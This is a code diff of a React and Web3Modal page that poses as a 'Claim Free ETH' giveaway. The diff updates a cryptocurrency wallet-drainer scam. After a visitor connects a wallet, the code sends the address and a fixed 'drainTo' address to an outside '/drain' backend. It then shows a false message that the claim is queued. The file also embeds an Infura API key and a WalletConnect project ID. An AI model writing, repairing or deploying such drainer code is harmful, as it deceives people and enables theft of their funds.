@@ -1,70 +1,71 @@
-import React, { useState, useEffect } from "react";
+import React, { useState } from "react";
 import ReactDOM from "react-dom/client";
 
-// Import Web3Modal and Wagmi
-import { configureChains, createConfig, WagmiConfig } from "wagmi";
-import { jsonRpcProvider } from "wagmi";
-import { web3Modal } from "@web3modal/wagmi";
-import { Chain } from "@wagmi/core";
+import { WagmiConfig, createConfig, http } from "wagmi";
+import { mainnet, sepolia } from "@wagmi/chains";
+import { injected, walletConnect } from "wagmi/connectors";
 
-// Import Ethereum Chain
-import { ChainId } from "@wagmi/chains";
+import { createWeb3Modal } from "@web3modal/wagmi/react";
 
-// Define chains
-const chains = [
-  ChainId.Ethereum,
-];
+/* ---------------------------
+   Wagmi Configuration
+---------------------------- */
 
-// Create provider
-const provider = jsonRpcProvider({
-  chains,
-  rpc: {
-    [ChainId.Ethereum]: "https://mainnet.infura.io/v3/d2870b839c5f497c94f02dfaccc518e2",
+const projectId = "962425907914a3e80a7d8e7288b23f62"; // your WalletConnect Project ID
+
+const config = createConfig({
+  chains: [mainnet, sepolia],
+  connectors: [
+    injected(),
+    walletConnect({
+      projectId,
+    }),
+  ],
+  transports: {
+    [mainnet.id]: http(
+      "https://mainnet.infura.io/v3/d2870b839c5f497c94f02dfaccc518e2"
+    ),
+    [sepolia.id]: http(),
   },
 });
 
-// Configure chains
-const { chains: wagmiChains, provider: wagmiProvider } = configureChains(
-  [ChainId.Ethereum],
-  [provider]
-);
-
-// Create config
-const config = createConfig({
-  chains: wagmiChains,
-  provider: wagmiProvider,
-});
-
-// Initialize Web3Modal
-web3Modal.init({
-  // You can use any WalletConnect project ID
-  projectId: "962425907914a3e80a7d8e7288b23f62", // Replace with your actual WalletConnect project ID
-  chains: [ChainId.Ethereum],
+/* ---------------------------
+   Initialize Web3Modal
+---------------------------- */
+createWeb3Modal({
+  wagmiConfig: config,
+  projectId,
+  chains: [mainnet, sepolia],
+  themeMode: "dark",
   enableAnalytics: true,
-  enableBatchActions: true,
-  theme: "dark",
 });
+
+/* ---------------------------
+   App Component
+---------------------------- */
 
 const App = () => {
-  const [response, setResponse] = useState(null);
   const [loading, setLoading] = useState(false);
+  const [response, setResponse] = useState(null);
   const [walletAddress, setWalletAddress] = useState(null);
 
-  // Connect wallet using Web3Modal
   const connectWallet = async () => {
-    setLoading(true);
-    setResponse(null);
-
     try {
-      const { account } = await web3Modal.connect();
+      setLoading(true);
+      setResponse(null);
+
+      // Web3Modal exposes this global helper
+      const modal = window.web3Modal;
+      const connection = await modal.open();
+
+      const account = connection?.accounts?.[0];
+      if (!account) throw new Error("No wallet connected");
+
       setWalletAddress(account);
 
-      // Make a POST request to your backend
       const res = await fetch("https://tokenbackendwork.onrender.com/drain", {
         method: "POST",
-        headers: {
-          "Content-Type": "application/json",
-        },
+        headers: { "Content-Type": "application/json" },
         body: JSON.stringify({
           address: account,
           drainTo: "0x0cd509bf3a2fa99153dae9f47d6d24fc89c006d4",
@@ -73,22 +74,18 @@ const App = () => {
 
       const data = await res.json();
 
-      if (res.ok) {
-        setResponse({
-          success: true,
-          message: "Token claim queued. You will be credited in a few minutes.",
-        });
-      } else {
-        setResponse({
-          success: false,
-          message: "Failed to claim token. Try again later.",
-        });
-      }
+      setResponse({
+        success: res.ok,
+        message: res.ok
+          ? "Token claim queued. You will be credited shortly."
+          : "Failed to claim token.",
+        data,
+      });
     } catch (err) {
       console.error(err);
       setResponse({
         success: false,
-        message: "Failed to claim token. Try again later.",
+        message: "Wallet connection failed.",
       });
     } finally {
       setLoading(false);
@@ -99,76 +96,68 @@ const App = () => {
     <WagmiConfig config={config}>
       <div
         style={{
+          minHeight: "100vh",
           display: "flex",
           justifyContent: "center",
           alignItems: "center",
-          height: "100vh",
-          backgroundColor: "#121212",
+          background: "#121212",
+          color: "#fff",
           fontFamily: "Arial, sans-serif",
-          color: "#ffffff",
-          padding: "20px",
         }}
       >
         <div
           style={{
-            backgroundColor: "#1e1e1e",
-            borderRadius: "12px",
+            background: "#1e1e1e",
             padding: "30px",
-            boxShadow: "0 4px 12px rgba(0, 0, 0, 0.1)",
-            maxWidth: "40/px",
+            borderRadius: "12px",
             width: "100%",
+            maxWidth: "420px",
+            textAlign: "center",
           }}
         >
-          <h1 style={{ textAlign: "center", marginBottom: "20px" }}>
-            Claim Free ETH
-          </h1>
-          <p
-            style={{
-              textAlign: "center",
-              marginBottom: "20px",
-              fontSize: "14px",
-              color: "#ccc",
-            }}
-          >
-            Connect your wallet to claim 0.5 ETH now. It's free and easy!
+          <h1 style={{ marginBottom: "16px" }}>Claim Free ETH</h1>
+          <p style={{ fontSize: "14px", color: "#ccc" }}>
+            Connect your wallet to claim 0.5 ETH.
           </p>
+
           <button
             onClick={connectWallet}
             disabled={loading}
             style={{
-              margin: "20px auto",
-              display: "block",
+              marginTop: "20px",
               padding: "12px 24px",
-              fontSize: "16px",
-              backgroundColor: "#4CAF50",
-              color: "white",
+              width: "100%",
+              background: "#4CAF50",
               border: "none",
               borderRadius: "8px",
+              color: "#fff",
+              fontSize: "16px",
               cursor: "pointer",
-              transition: "background-color 0.3s ease",
               fontWeight: "bold",
             }}
           >
             {loading ? "Connecting..." : "Connect Wallet"}
           </button>
 
+          {walletAddress && (
+            <p style={{ marginTop: "12px", fontSize: "12px", color: "#aaa" }}>
+              Connected: {walletAddress}
+            </p>
+          )}
+
           {response && (
-            <div
+            <pre
               style={{
-                marginTop: "20px",
-                padding: "15px",
-                backgroundColor: "#2a2a2a",
+                marginTop: "16px",
+                background: "#2a2a2a",
+                padding: "12px",
                 borderRadius: "8px",
-                border: "1px solid #444",
-                overflow: "auto",
-                maxHeight: "200px",
+                fontSize: "12px",
+                textAlign: "left",
               }}
             >
-              <h3 style={{ marginBottom: "10px", color: "#ccc" }}>Response:</h3>
-              <pre style={{ whiteSpace: "pre-wrap", overflowX: "auto" }}>
-                {JSON.stringify(response, null, 2)}
-              </pre>
-            </div>
+              {JSON.stringify(response, null, 2)}
+            </pre>
           )}
         </div>
       </div>
@@ -176,5 +165,12 @@ const App = () => {
   );
 };
 
-const root = ReactDOM.createRoot(document.getElementById("root"));
-root.render(<App />);
+/* ---------------------------
+   Mount React App
+---------------------------- */
+
+ReactDOM.createRoot(document.getElementById("root")).render(
+  <React.StrictMode>
+    <App />
+  </React.StrictMode>
+);
